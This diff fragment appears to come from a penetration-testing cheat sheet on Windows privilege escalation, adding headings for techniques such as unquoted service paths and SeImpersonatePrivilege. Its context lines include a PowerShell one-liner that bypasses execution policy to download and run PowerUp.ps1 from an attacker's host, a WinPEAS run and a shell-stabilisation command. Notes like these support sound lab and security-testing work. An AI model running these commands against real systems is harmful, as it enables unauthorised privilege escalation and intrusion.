@@ -31,7 +31,10 @@
  3. or `powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://myIP:80/PowerUp.ps1');Invoke-AllChecks"`
  4. Use WinPeas
  5. `winpeas.exe`
- 
+ ### Unquoted Service Path
+ ### Writable Service Executable
+ ### AlwaysInstallElevate
+ ### SeImpersonatePrivilege 
 
 ## File Transfer to Linux victim
 0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
